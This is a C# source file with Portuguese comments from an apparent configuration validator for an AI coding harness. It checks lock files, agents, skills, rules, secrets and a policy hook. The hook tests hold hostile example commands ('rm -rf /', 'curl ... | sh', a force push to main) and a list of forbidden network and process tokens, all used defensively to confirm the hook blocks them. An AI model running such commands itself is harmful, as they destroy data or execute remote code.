using System.Text.Json;
using System.Text.Json.Nodes;
using System.Text.RegularExpressions;
using Mariliz.Application.Discovery;
using Mariliz.Application.Execution;
using Mariliz.Application.Harness;
using Mariliz.Application.Ports;
using Mariliz.Core.Discovery;
using Mariliz.Core.Evals;
using Mariliz.Core.Plan;
using Mariliz.Core.Policy;
using Mariliz.Core.Text;

namespace Mariliz.Application.Validation;

public sealed record ValidationContext(
    IProjectFiles Files,
    string RootPath,
    DiscoveryReport Discovery,
    ManagedLockFile? Lock,
    DeclaredConfig? Declared,
    string? DeclaredError,
    IProcessRunner Runner,
    Func<CancellationToken, Task<ConfigurationPlan>> Replan,
    IReadOnlyList<EvalSummary> PreviousEvals);

public static class EvalIds
{
    public const string Config = "EV-CONFIG-001";
    public const string Lock = "EV-LOCK-001";
    public const string Agent = "EV-AGENT-001";
    public const string Skill = "EV-SKILL-001";
    public const string Hook = "EV-HOOK-001";
    public const string Rule = "EV-RULE-001";
    public const string Reference = "EV-REF-001";
    public const string Tlc = "EV-TLC-001";
    public const string Secrets = "EV-SEC-001";
    public const string Environment = "EV-ENV-001";
    public const string Requirements = "EV-REQ-001";
    public const string Idempotence = "EV-IDEMP-001";
    public const string Regression = "EV-REGR-001";
    public const string Judge = "EV-JUDGE-001";
}

/// <summary>
/// Evals do Harness. Verificações determinísticas e observáveis decidem tudo o que podem; o juiz por modelo
/// existe no catálogo, mas não roda nesta fase e nunca aprova sozinho. Evidências citam caminhos, códigos e
/// contagens, nunca valores de segredos.
/// </summary>
public static class EvalRunner
{
    private static readonly TimeSpan ScriptTimeout = TimeSpan.FromSeconds(20);

    private sealed record Spec(string Id, string Name, string Property, EvalKind Kind, bool Required, string Criteria);

    private static readonly Spec[] Specs =
    [
        new(EvalIds.Config, "Declaração e lock", "Integridade e completude da configuração", EvalKind.Deterministic, true,
            "mariliz.yaml (se existir) e mariliz.lock são válidos, no schema 1, e declaram o mesmo ambiente de IA."),
        new(EvalIds.Lock, "Arquivos gerenciados", "Integridade dos arquivos escritos pela aplicação", EvalKind.Deterministic, true,
            "Todo arquivo do lock existe e tem o hash registrado; os arquivos mesclados mantêm as chaves gerenciadas."),
        new(EvalIds.Agent, "Agentes", "Conformidade dos agentes gerenciados", EvalKind.Deterministic, true,
            "Frontmatter com name igual ao arquivo, description e tools explícitos; seções obrigatórias; ferramentas dentro do conjunto permitido; agente somente leitura sem Edit/Write."),
        new(EvalIds.Skill, "Skills", "Conformidade das skills gerenciadas", EvalKind.Deterministic, true,
            "SKILL.md com frontmatter, name igual à pasta e description."),
        new(EvalIds.Hook, "Hooks", "Conformidade e comportamento do hook de política", EvalKind.Deterministic, true,
            "settings.json válido com o hook registrado uma vez, script presente e íntegro, sem rede nem escrita, e as decisões esperadas para entradas conhecidas."),
        new(EvalIds.Rule, "Regras", "Presença das regras exigidas", EvalKind.Deterministic, true,
            "As regras gerais e as de cada stack detectada existem, não estão vazias, e as de stack têm 'paths' válidos."),
        new(EvalIds.Reference, "Referências", "Consistência de referências", EvalKind.Deterministic, true,
            "Todo link relativo dos arquivos Markdown gerenciados aponta para um arquivo que existe."),
        new(EvalIds.Tlc, "TLC operacional", "O método SDD é utilizável", EvalKind.Deterministic, true,
            "Instalação completa, hash igual ao do instalador, versão validada, Python disponível, e os scripts do TLC respondem corretamente a entradas conhecidas."),
        new(EvalIds.Secrets, "Segredos", "Ausência de credenciais nos arquivos de configuração", EvalKind.Deterministic, true,
            "Nenhum arquivo gerenciado, .mcp.json, mariliz.yaml ou proposta contém formato conhecido de credencial."),
        new(EvalIds.Environment, "Ambiente de IA", "Compatibilidade com o ambiente selecionado", EvalKind.Deterministic, true,
            "O ambiente declarado é suportado e nenhum arquivo gerenciado está fora das pastas desse ambiente."),
        new(EvalIds.Requirements, "Requisitos do projeto", "Cumprimento dos requisitos identificados", EvalKind.Deterministic, true,
            "Cada requisito derivado da descoberta (stack, comandos, proteção por hook) tem o artefato correspondente. O TLC é verificado à parte."),
        new(EvalIds.Idempotence, "Idempotência", "Repetir o fluxo não altera nada", EvalKind.Deterministic, true,
            "Um novo plano não contém criação, atualização, remoção, conflito nem comando."),
        new(EvalIds.Regression, "Regressão", "Nenhuma verificação que passava passou a falhar", EvalKind.Deterministic, false,
            "Todo Eval aprovado na execução anterior continua aprovado."),
        new(EvalIds.Judge, "Juiz por modelo", "Qualidade semântica do Harness", EvalKind.Model, false,
            "Avaliação por modelo com critérios explícitos; nunca aprova sozinha.")
    ];

    public static IReadOnlyList<string> CatalogIds => Specs.Select(s => s.Id).ToList();

    public static async Task<ValidationReport> RunAsync(ValidationContext ctx, CancellationToken ct)
    {
        var requiredExtra = ctx.Declared?.Evals.Required.ToHashSet(StringComparer.Ordinal) ?? [];
        var results = new List<EvalResult>();

        foreach (var spec in Specs)
        {
            ct.ThrowIfCancellationRequested();
            var required = spec.Required || requiredExtra.Contains(spec.Id);
            EvalResult result;
            try
            {
                result = spec.Id switch
                {
                    EvalIds.Config => Config(spec, ctx),
                    EvalIds.Lock => LockIntegrity(spec, ctx),
                    EvalIds.Agent => Agents(spec, ctx),
                    EvalIds.Skill => Skills(spec, ctx),
                    EvalIds.Hook => await HookAsync(spec, ctx, ct),
                    EvalIds.Rule => Rules(spec, ctx),
                    EvalIds.Reference => References(spec, ctx),
                    EvalIds.Tlc => await TlcAsync(spec, ctx, ct),
                    EvalIds.Secrets => Secrets(spec, ctx),
                    EvalIds.Environment => Environment(spec, ctx),
                    EvalIds.Requirements => Requirements(spec, ctx),
                    EvalIds.Idempotence => await IdempotenceAsync(spec, ctx, ct),
                    EvalIds.Regression => Regression(spec, ctx, results),
                    EvalIds.Judge => NotRun(spec, "Nenhum modelo está configurado: esta fase não chama modelos de IA. O juiz semântico fica para uma fase futura."),
                    _ => NotRun(spec, "Eval desconhecido.")
                };
            }
            catch (OperationCanceledException) { throw; }
            catch (Exception ex)
            {
                // Um Eval que quebra não vira aprovação: fica bloqueado, com o tipo do erro (sem o texto, que pode ter dados).
                result = Make(spec, EvalStatus.Blocked, [], $"O Eval não pôde ser executado ({ex.GetType().Name}).", []);
            }
            results.Add(result with { Required = required });
        }
        return new ValidationReport(results);
    }

    // ------------------------------------------------------------------ Config e lock

    private static EvalResult Config(Spec spec, ValidationContext ctx)
    {
        var evidence = new List<string>();
        if (ctx.DeclaredError is not null) return Fail(spec, ctx.DeclaredError, [DeclaredConfig.FileName]);
        if (ctx.Lock is null)
            return ctx.Files.FileExists(ManagedLockFile.FileName)
                ? Fail(spec, "mariliz.lock existe, mas não é um YAML válido.", [ManagedLockFile.FileName])
                : Block(spec, "mariliz.lock não existe: nenhuma configuração foi aplicada neste projeto.");

        if (ctx.Lock.Schema != 1) return Fail(spec, $"mariliz.lock com schema {ctx.Lock.Schema}; esperado 1.", [ManagedLockFile.FileName]);
        if (string.IsNullOrWhiteSpace(ctx.Lock.Engine)) return Fail(spec, "mariliz.lock sem a versão do motor.", [ManagedLockFile.FileName]);
        if (!AiEnvironments.Known.Contains(ctx.Lock.AiEnvironment)) return Fail(spec, "mariliz.lock declara um ambiente de IA desconhecido.", [ManagedLockFile.FileName]);
        evidence.Add($"{ManagedLockFile.FileName}: schema 1, motor {ctx.Lock.Engine}, ambiente {ctx.Lock.AiEnvironment}, {ctx.Lock.ManagedFiles.Count} arquivo(s)");

        if (ctx.Declared is not null)
        {
            if (ctx.Declared.AiEnvironment.Length > 0 && ctx.Declared.AiEnvironment != ctx.Lock.AiEnvironment)
                return Fail(spec, $"mariliz.yaml declara '{ctx.Declared.AiEnvironment}', mas o lock registra '{ctx.Lock.AiEnvironment}'.", [DeclaredConfig.FileName, ManagedLockFile.FileName]);
            evidence.Add($"{DeclaredConfig.FileName}: schema 1, method.sdd=tlc");
        }
        return Pass(spec, evidence);
    }

    private static EvalResult LockIntegrity(Spec spec, ValidationContext ctx)
    {
        if (ctx.Lock is null) return Block(spec, "Sem mariliz.lock, não há o que conferir.");
        var problems = new List<string>();
        var checkedFiles = 0;

        foreach (var entry in ctx.Lock.ManagedFiles)
        {
            if (!PathGuard.TryNormalize(entry.Path, out var path, out _) || !ManagedScope.IsWritable(path))
            { problems.Add($"{entry.Path}: caminho fora do escopo gerenciado."); continue; }

            var bytes = ctx.Files.ReadBytes(path);
            if (bytes is null) { problems.Add($"{path}: ausente."); continue; }
            checkedFiles++;

            if (entry.Mode == "file" && Hashing.Sha256(bytes) != entry.Sha256) problems.Add($"{path}: o conteúdo difere do hash registrado.");
            if (entry.Mode == "merge" && path == Catalog.PathSettings)
            {
                var text = System.Text.Encoding.UTF8.GetString(bytes);
                if (!text.Contains(Catalog.PathHookScript, StringComparison.Ordinal)) problems.Add($"{path}: o hook gerenciado não está mais registrado.");
            }
        }

        return problems.Count == 0
            ? Pass(spec, [$"{checkedFiles} arquivo(s) conferido(s) contra o lock"])
            : Fail(spec, $"{problems.Count} divergência(s) entre o lock e o disco.", problems);
    }

    // ------------------------------------------------------------------ Agentes e skills

    private static readonly Dictionary<string, string[]> AgentTools = new()
    {
        [Catalog.PathHarnessEngineer] = ["Read", "Grep", "Glob", "Write"],
        [Catalog.PathCodeReviewer] = ["Read", "Grep", "Glob", "Bash"],
        [Catalog.PathVerifier] = ["Read", "Grep", "Glob", "Bash", "Write"]
    };

    private static readonly string[] AgentSections = ["## Role", "## Use when", "## Do not use when", "## Required context", "## Inviolable rules", "## Output format"];
    private static readonly string[] WriteTools = ["Edit", "Write", "NotebookEdit", "MultiEdit"];

    private static EvalResult Agents(Spec spec, ValidationContext ctx)
    {
        if (ctx.Lock is null) return Block(spec, "Sem mariliz.lock, não há agentes gerenciados a conferir.");
        var agents = ctx.Lock.ManagedFiles.Where(f => f.Path.StartsWith(".claude/agents/", StringComparison.Ordinal)).ToList();
        if (agents.Count == 0) return Pass(spec, ["Nenhum agente gerenciado"], ["Nenhum agente foi configurado neste projeto."]);

        var problems = new List<string>();
        foreach (var entry in agents)
        {
            var text = ctx.Files.ReadText(entry.Path);
            if (text is null) { problems.Add($"{entry.Path}: ilegível."); continue; }
            var name = Path.GetFileNameWithoutExtension(entry.Path);
            var issue = ProjectDiscoverer.FrontmatterIssue(text, name, requireTools: true);
            if (issue is not null) { problems.Add($"{entry.Path}: {issue}"); continue; }

            foreach (var section in AgentSections.Where(s => !text.Contains("\n" + s + "\n", StringComparison.Ordinal)))
                problems.Add($"{entry.Path}: falta a seção '{section}'.");

            var tools = FrontmatterReader.Read(text)!["tools"].Split(',', StringSplitOptions.RemoveEmptyEntries | StringSplitOptions.TrimEntries);
            if (AgentTools.TryGetValue(entry.Path, out var allowed))
            {
                var extra = tools.Except(allowed, StringComparer.Ordinal).ToList();
                if (extra.Count > 0) problems.Add($"{entry.Path}: ferramentas fora do conjunto permitido ({string.Join(", ", extra)}).");
            }
            if (entry.Path == Catalog.PathCodeReviewer && tools.Any(t => WriteTools.Contains(t)))
                problems.Add($"{entry.Path}: agente somente leitura com ferramenta de escrita.");
        }

        return problems.Count == 0
            ? Pass(spec, agents.Select(a => $"{a.Path}: conforme").ToList())
            : Fail(spec, $"{problems.Count} não conformidade(s) nos agentes.", problems);
    }

    private static EvalResult Skills(Spec spec, ValidationContext ctx)
    {
        if (ctx.Lock is null) return Block(spec, "Sem mariliz.lock, não há skills gerenciadas a conferir.");
        var skills = ctx.Lock.ManagedFiles.Where(f => f.Path.EndsWith("/SKILL.md", StringComparison.Ordinal)).ToList();
        if (skills.Count == 0) return Pass(spec, ["Nenhuma skill gerenciada"], ["Nenhuma skill foi configurada neste projeto."]);

        var problems = new List<string>();
        foreach (var entry in skills)
        {
            var folder = entry.Path.Split('/')[2];
            var issue = ProjectDiscoverer.FrontmatterIssue(ctx.Files.ReadText(entry.Path), folder, requireTools: false);
            if (issue is not null) problems.Add($"{entry.Path}: {issue}");
        }
        return problems.Count == 0
            ? Pass(spec, skills.Select(s => $"{s.Path}: conforme").ToList())
            : Fail(spec, $"{problems.Count} não conformidade(s) nas skills.", problems);
    }

    // ------------------------------------------------------------------ Hook

    private static readonly string[] ForbiddenHookTokens = ["subprocess", "socket", "urllib", "requests", "http.client", "os.system", "shutil", "os.remove", "os.rename", "open("];

    private static async Task<EvalResult> HookAsync(Spec spec, ValidationContext ctx, CancellationToken ct)
    {
        if (ctx.Lock is null) return Block(spec, "Sem mariliz.lock, não há hook gerenciado a conferir.");
        var entry = ctx.Lock.ManagedFiles.FirstOrDefault(f => f.Path == Catalog.PathHookScript);
        if (entry is null) return Pass(spec, ["Nenhum hook gerenciado"], ["O hook de política não foi configurado neste projeto."]);

        var evidence = new List<string>();
        var settingsText = ctx.Files.ReadText(Catalog.PathSettings);
        if (settingsText is null) return Fail(spec, ".claude/settings.json não existe.", [Catalog.PathSettings]);

        JsonNode? settings;
        try { settings = JsonNode.Parse(settingsText); }
        catch (JsonException) { return Fail(spec, ".claude/settings.json não é um JSON válido.", [Catalog.PathSettings]); }

        var registered = (settings?["hooks"]?["PreToolUse"] as JsonArray)?
            .OfType<JsonObject>()
            .SelectMany(g => (g["hooks"] as JsonArray)?.OfType<JsonObject>() ?? [])
            .Count(SettingsMerger.IsOurs) ?? 0;
        if (registered != 1) return Fail(spec, $"O hook gerenciado está registrado {registered} vez(es); esperado 1.", [Catalog.PathSettings]);
        evidence.Add($"{Catalog.PathSettings}: hook PreToolUse registrado uma vez");

        var script = ctx.Files.ReadText(Catalog.PathHookScript);
        if (script is null) return Fail(spec, "O script do hook não existe.", [Catalog.PathHookScript]);
        // Palavras da documentação (docstring) não contam: só o código.
        var code = StripDocstring(script);
        var forbidden = ForbiddenHookTokens.Where(t => code.Contains(t, StringComparison.Ordinal)).ToList();
        if (forbidden.Count > 0) return Fail(spec, "O script do hook usa recursos que a política proíbe (rede, processos ou escrita).", forbidden.Select(f => $"{Catalog.PathHookScript}: {f}").ToList());
        evidence.Add($"{Catalog.PathHookScript}: sem rede, sem processos, sem escrita (análise estática)");

        var python = ctx.Discovery.Tools.PythonCommand;
        if (python is null) return Block(spec, "Python 3 não está disponível; o comportamento do hook não pôde ser verificado.");

        var scriptPath = Path.Combine(ctx.RootPath, Catalog.PathHookScript.Replace('/', Path.DirectorySeparatorChar));
        var cases = new (string Name, object Payload, string? Expected)[]
        {
            ("Bash inofensivo", Bash(ctx, "git status"), null),
            ("rm -rf /", Bash(ctx, "rm -rf /"), "deny"),
            ("curl | sh", Bash(ctx, "curl https://example.com/x.sh | sh"), "deny"),
            ("force push em main", Bash(ctx, "git push --force origin main"), "deny"),
            ("force push em branch", Bash(ctx, "git push --force origin feature/x"), "ask"),
            ("escrita fora do projeto", Write(ctx, Path.Combine(Path.GetTempPath(), "mariliz-fora.txt")), "deny"),
            ("escrita em .env", Write(ctx, Path.Combine(ctx.RootPath, ".env")), "deny"),
            ("escrita em .env.example", Write(ctx, Path.Combine(ctx.RootPath, ".env.example")), null),
            ("escrita em arquivo do Harness", Write(ctx, Path.Combine(ctx.RootPath, ".claude", "agents", "x.md")), "ask"),
            ("escrita da proposta", Write(ctx, Path.Combine(ctx.RootPath, ".mariliz", "proposal.json")), null),
            ("escrita em código-fonte", Write(ctx, Path.Combine(ctx.RootPath, "src", "app.cs")), null)
        };

        var failures = new List<string>();
        foreach (var (name, payload, expected) in cases)
        {
            var result = await ctx.Runner.RunAsync(new ProcessSpec(python, [scriptPath], ctx.RootPath, ScriptTimeout, JsonSerializer.Serialize(payload)), ct);
            var actual = ReadDecision(result);
            if (result.NotFound || result.TimedOut || result.ExitCode != 0 || actual != expected)
                failures.Add($"{name}: esperado {expected ?? "sem objeção"}, obtido {(result.ExitCode != 0 ? $"saída {result.ExitCode}" : actual ?? "sem objeção")}");
        }
        if (failures.Count > 0) return Fail(spec, $"{failures.Count} caso(s) do hook com decisão inesperada.", failures);
        evidence.Add($"{cases.Length} entradas conhecidas com a decisão esperada ({python} {Catalog.PathHookScript})");
        return Pass(spec, evidence, ["O hook é uma barreira de apoio: casa texto de comandos e não é um limite de segurança."]);
    }

    private static object Bash(ValidationContext ctx, string command) => new
    { hook_event_name = "PreToolUse", tool_name = "Bash", cwd = ctx.RootPath, tool_input = new { command } };

    private static object Write(ValidationContext ctx, string path) => new
    { hook_event_name = "PreToolUse", tool_name = "Write", cwd = ctx.RootPath, tool_input = new { file_path = path, content = "x" } };

    private static string? ReadDecision(ProcessResult result)
    {
        if (string.IsNullOrWhiteSpace(result.StandardOutput)) return null;
        try
        {
            using var doc = JsonDocument.Parse(result.StandardOutput);
            return doc.RootElement.GetProperty("hookSpecificOutput").GetProperty("permissionDecision").GetString();
        }
        catch (Exception ex) when (ex is JsonException or KeyNotFoundException or InvalidOperationException) { return "formato-inválido"; }
    }

    private static string StripDocstring(string script)
    {
        var m = Regex.Match(script, "\"\"\"[\\s\\S]*?\"\"\"");
        return m.Success ? script.Remove(m.Index, m.Length) : script;
    }

    // ------------------------------------------------------------------ Regras e referências

    private static EvalResult Rules(Spec spec, ValidationContext ctx)
    {
        if (ctx.Lock is null) return Block(spec, "Sem mariliz.lock, não há regras gerenciadas a conferir.");
        var rules = ctx.Lock.ManagedFiles.Where(f => f.Path.StartsWith(".claude/rules/", StringComparison.Ordinal)).ToList();
        var problems = new List<string>();

        if (!rules.Any(r => r.Path == Catalog.PathRuleGeneral) && !(ctx.Declared?.Components.Exclude.Contains(Catalog.RuleGeneral) ?? false))
            problems.Add($"{Catalog.PathRuleGeneral}: a regra geral não está no lock.");

        foreach (var rule in rules)
        {
            var text = ctx.Files.ReadText(rule.Path);
            if (string.IsNullOrWhiteSpace(text)) { problems.Add($"{rule.Path}: ausente ou vazio."); continue; }
            if (rule.Path.Contains("mariliz-stack-", StringComparison.Ordinal))
            {
                var m = Regex.Match(text, @"\A---\n(?<fm>[\s\S]*?)\n---\n");
                if (!m.Success || !Regex.IsMatch(m.Groups["fm"].Value, @"^paths:\s*\n(\s+- "".+""\n?)+", RegexOptions.Multiline))
                    problems.Add($"{rule.Path}: frontmatter 'paths' ausente ou inválido.");
            }
        }
        return problems.Count == 0
            ? Pass(spec, rules.Select(r => $"{r.Path}: presente").ToList())
            : Fail(spec, $"{problems.Count} problema(s) nas regras.", problems);
    }

    private static EvalResult References(Spec spec, ValidationContext ctx)
    {
        if (ctx.Lock is null) return Block(spec, "Sem mariliz.lock, não há arquivos gerenciados a conferir.");
        var markdown = ctx.Lock.ManagedFiles.Where(f => f.Path.EndsWith(".md", StringComparison.Ordinal) && f.Mode == "file").ToList();
        var problems = new List<string>();
        var links = 0;

        foreach (var file in markdown)
        {
            var text = ctx.Files.ReadText(file.Path);
            if (text is null) continue;
            var dir = file.Path.Contains('/') ? file.Path[..file.Path.LastIndexOf('/')] : "";
            foreach (Match m in Regex.Matches(text, @"\]\((?<t>[^)\s]+)\)"))
            {
                var target = m.Groups["t"].Value;
                if (Regex.IsMatch(target, @"^[a-z][a-z0-9+.-]*:", RegexOptions.IgnoreCase) || target.StartsWith('#')) continue;
                links++;
                var clean = target.Split('#')[0];
                var joined = clean.StartsWith('/') ? clean.TrimStart('/') : (dir.Length == 0 ? clean : dir + "/" + clean);
                if (!PathGuard.TryNormalize(Resolve(joined), out var normalized, out _) || !(ctx.Files.FileExists(normalized) || ctx.Files.DirectoryExists(normalized)))
                    problems.Add($"{file.Path}: o link '{target}' não resolve.");
            }
        }
        return problems.Count == 0
            ? Pass(spec, [$"{markdown.Count} arquivo(s) Markdown, {links} link(s) relativo(s) resolvidos"])
            : Fail(spec, $"{problems.Count} link(s) quebrado(s).", problems);
    }

    private static string Resolve(string path)
    {
        var stack = new List<string>();
        foreach (var part in path.Split('/', StringSplitOptions.RemoveEmptyEntries))
        {
            if (part == ".") continue;
            if (part == ".." && stack.Count > 0) stack.RemoveAt(stack.Count - 1);
            else if (part == "..") return "../escape";
            else stack.Add(part);
        }
        return string.Join('/', stack);
    }

    // ------------------------------------------------------------------ TLC

    private static async Task<EvalResult> TlcAsync(Spec spec, ValidationContext ctx, CancellationToken ct)
    {
        var tlc = TlcInspector.Inspect(ctx.Files);
        var evidence = new List<string>();
        var limitations = new List<string>();

        if (tlc.State == TlcState.NotInstalled) return Block(spec, "O TLC não está instalado neste projeto.");
        if (tlc.State is TlcState.Invalid or TlcState.Drifted)
            return Fail(spec, tlc.State == TlcState.Invalid ? "A instalação do TLC está incompleta ou inválida." : "A instalação do TLC difere do hash do instalador.", tlc.Problems);

        evidence.Add($"{TlcManifest.SkillDirectory}: {TlcManifest.RequiredFiles.Count} arquivos exigidos presentes");
        evidence.Add($"Hash conferido com {TlcManifest.LockFile} ({tlc.LockedHash![..12]}…)");
        if (!tlc.VersionTested) limitations.Add($"A versão {tlc.Version ?? "desconhecida"} do TLC não foi validada por esta fase (validada: {string.Join(", ", TlcManifest.TestedVersions)}).");
        else evidence.Add($"Versão {tlc.Version} validada por esta fase");

        var python = ctx.Discovery.Tools.PythonCommand;
        if (python is null) return Block(spec, "Python 3 não está disponível; os gates do TLC não puderam ser executados.");

        var scripts = Path.Combine(ctx.RootPath, TlcManifest.SkillDirectory.Replace('/', Path.DirectorySeparatorChar), "scripts");
        var good = await ctx.Runner.RunAsync(new ProcessSpec(python, [Path.Combine(scripts, "check_commit.py"), "--message", "feat(core): add validation"], ctx.RootPath, ScriptTimeout), ct);
        var bad = await ctx.Runner.RunAsync(new ProcessSpec(python, [Path.Combine(scripts, "check_commit.py"), "--message", "Mensagem sem tipo"], ctx.RootPath, ScriptTimeout), ct);
        var self = await ctx.Runner.RunAsync(new ProcessSpec(python, [Path.Combine(scripts, "lessons.py"), "selftest"], ctx.RootPath, ScriptTimeout), ct);

        var failures = new List<string>();
        if (good.ExitCode != 0) failures.Add($"check_commit.py rejeitou uma mensagem válida (saída {good.ExitCode}).");
        if (bad.ExitCode != 1) failures.Add($"check_commit.py não rejeitou uma mensagem inválida (saída {bad.ExitCode}, esperado 1).");
        if (self.ExitCode != 0) failures.Add($"lessons.py selftest falhou (saída {self.ExitCode}).");
        if (failures.Count > 0) return Fail(spec, "Os scripts do TLC não responderam como esperado.", failures);

        evidence.Add("check_commit.py: aceita 'feat(core): add validation' (saída 0) e rejeita uma mensagem sem tipo (saída 1)");
        evidence.Add("lessons.py selftest: saída 0");
        return Pass(spec, evidence, limitations);
    }

    // ------------------------------------------------------------------ Segredos, ambiente, requisitos

    private static EvalResult Secrets(Spec spec, ValidationContext ctx)
    {
        var paths = new List<string> { DeclaredConfig.FileName, ManagedLockFile.FileName, ".mcp.json", Catalog.PathProposal };
        paths.AddRange(ctx.Lock?.ManagedFiles.Select(f => f.Path) ?? []);
        var findings = new List<string>();
        var scanned = 0;

        foreach (var path in paths.Distinct(StringComparer.Ordinal))
        {
            var text = ctx.Files.ReadText(path);
            if (text is null) continue;
            scanned++;
            foreach (var f in SecretScanner.Scan(text)) findings.Add($"{path}:{f.Line} ({f.Rule})");
        }
        return findings.Count == 0
            ? Pass(spec, [$"{scanned} arquivo(s) verificado(s); nenhum formato conhecido de credencial"])
            : Fail(spec, $"{findings.Count} possível(is) credencial(is) encontrada(s); os valores não são exibidos.", findings);
    }

    private static EvalResult Environment(Spec spec, ValidationContext ctx)
    {
        if (ctx.Lock is null) return Block(spec, "Sem mariliz.lock, o ambiente de IA configurado não é conhecido.");
        if (!AiEnvironments.Supported.Contains(ctx.Lock.AiEnvironment))
            return Fail(spec, $"O ambiente '{ctx.Lock.AiEnvironment}' não é suportado por esta fase.", [ManagedLockFile.FileName]);

        var outside = ctx.Lock.ManagedFiles
            .Where(f => !(f.Path.StartsWith(".claude/", StringComparison.Ordinal) || f.Path.StartsWith(".mariliz/", StringComparison.Ordinal) || f.Path is DeclaredConfig.FileName or ManagedLockFile.FileName))
            .Select(f => f.Path).ToList();
        return outside.Count == 0
            ? Pass(spec, [$"Ambiente claude-code; {ctx.Lock.ManagedFiles.Count} arquivo(s) todos em .claude/, .mariliz/ ou na raiz de configuração"])
            : Fail(spec, "Há arquivos gerenciados fora das pastas do ambiente.", outside);
    }

    private static EvalResult Requirements(Spec spec, ValidationContext ctx)
    {
        if (ctx.Lock is null) return Block(spec, "Sem mariliz.lock, não há configuração para comparar com os requisitos.");
        var excluded = ctx.Declared?.Components.Exclude.ToHashSet(StringComparer.Ordinal) ?? [];
        var have = ctx.Lock.ManagedFiles.Select(f => f.Path).ToHashSet(StringComparer.Ordinal);
        var missing = new List<string>();
        var checks = 0;

        void Need(string component, string path, string why)
        {
            if (excluded.Contains(component)) return;
            checks++;
            if (!have.Contains(path)) missing.Add($"{path}: {why}");
        }

        Need(Catalog.RuleGeneral, Catalog.PathRuleGeneral, "regras gerais exigidas");
        Need(Catalog.AgentHarnessEngineer, Catalog.PathHarnessEngineer, "o Harness Engineer planeja a configuração");
        if (ctx.Discovery.Stacks.Any(s => s.Id == "dotnet")) Need(Catalog.RuleStackDotnet, Catalog.PathRuleDotnet, "stack .NET detectada");
        if (ctx.Discovery.Stacks.Any(s => s.Id is "node" or "nextjs" or "react" or "angular")) Need(Catalog.RuleStackJavascript, Catalog.PathRuleJavascript, "stack JavaScript/TypeScript detectada");
        if (ctx.Discovery.Tooling.Any(t => t.Command is not null && t.Kind is "build" or "test" or "lint" or "typecheck")) Need(Catalog.RuleRepoCommands, Catalog.PathRuleRepo, "comandos do repositório detectados");
        if (ctx.Discovery.Tools.PythonCommand is not null) Need(Catalog.HookPolicy, Catalog.PathHookScript, "Python disponível: o hook de política é exigido");

        // O TLC é verificado pelo EV-TLC-001 (bloqueado quando não instalado); contá-lo aqui duplicaria a falha.

        return missing.Count == 0
            ? Pass(spec, [$"{checks} requisito(s) derivado(s) da descoberta, todos atendidos"])
            : Fail(spec, $"{missing.Count} requisito(s) sem o artefato correspondente.", missing);
    }

    // ------------------------------------------------------------------ Idempotência e regressão

    private static async Task<EvalResult> IdempotenceAsync(Spec spec, ValidationContext ctx, CancellationToken ct)
    {
        if (ctx.Lock is null) return Block(spec, "Sem mariliz.lock, não há uma configuração aplicada para repetir.");
        var plan = await ctx.Replan(ct);
        var managed = ctx.Lock.ManagedFiles.Where(f => f.Mode != "kept").Select(f => f.Path).ToHashSet(StringComparer.Ordinal);

        // Mudança em arquivo que a aplicação já gerencia = a configuração não se repete igual: falha.
        var drift = plan.Changes
            .Where(c => c.Action is ChangeAction.Create or ChangeAction.Update or ChangeAction.Remove && managed.Contains(c.Path))
            .Select(c => $"{c.Path}: {c.Action}").ToList();
        // Pendências de decisão (comando, arquivo ainda não aplicado, conflito): não é falha, é o que falta aprovar.
        var pending = plan.Changes
            .Where(c => c.Action == ChangeAction.Conflict || (c.Action is ChangeAction.Create or ChangeAction.Update or ChangeAction.Remove && !managed.Contains(c.Path)))
            .Select(c => $"{c.Path}: {c.Action}").ToList();
        pending.AddRange(plan.Commands.Select(c => $"comando {c.Id}"));

        if (drift.Count > 0) return Fail(spec, "Um novo plano ainda altera arquivos que a aplicação já gerencia: a configuração não é idempotente.", drift);
        if (pending.Count > 0) return Block(spec, $"Há {pending.Count} item(ns) pendente(s) de aprovação ({string.Join(", ", pending.Take(3))}); a idempotência só pode ser avaliada com tudo aplicado.");

        return Pass(spec, [$"Novo plano: {plan.Changes.Count(c => c.Action == ChangeAction.Preserve)} arquivo(s) preservado(s), nenhuma alteração, nenhum comando"]);
    }

    private static EvalResult Regression(Spec spec, ValidationContext ctx, List<EvalResult> current)
    {
        if (ctx.PreviousEvals.Count == 0) return NotRun(spec, "Não há execução anterior para comparar.");
        var regressions = new List<string>();
        foreach (var previous in ctx.PreviousEvals.Where(p => p.Status == nameof(EvalStatus.Passed)))
        {
            var now = current.FirstOrDefault(r => r.Id == previous.Id);
            if (now is not null && now.Status != EvalStatus.Passed) regressions.Add($"{previous.Id}: passava e agora está {now.Status}");
        }
        return regressions.Count == 0
            ? Pass(spec, [$"{ctx.PreviousEvals.Count(p => p.Status == nameof(EvalStatus.Passed))} Eval(s) aprovado(s) antes continuam aprovados"])
            : Fail(spec, $"{regressions.Count} regressão(ões) em relação à execução anterior.", regressions);
    }

    // ------------------------------------------------------------------ Resultado

    private static EvalResult Pass(Spec spec, IReadOnlyList<string> evidence, IReadOnlyList<string>? limitations = null) =>
        Make(spec, EvalStatus.Passed, evidence, null, limitations ?? []);

    private static EvalResult Fail(Spec spec, string reason, IReadOnlyList<string> evidence) =>
        Make(spec, EvalStatus.Failed, evidence, reason, []);

    private static EvalResult Block(Spec spec, string reason) => Make(spec, EvalStatus.Blocked, [], reason, []);

    private static EvalResult NotRun(Spec spec, string reason) => Make(spec, EvalStatus.NotRun, [], reason, []);

    private static EvalResult Make(Spec spec, EvalStatus status, IReadOnlyList<string> evidence, string? reason, IReadOnlyList<string> limitations) =>
        new(spec.Id, spec.Name, spec.Property, spec.Kind, spec.Required, status, spec.Criteria, evidence, reason, limitations);
}
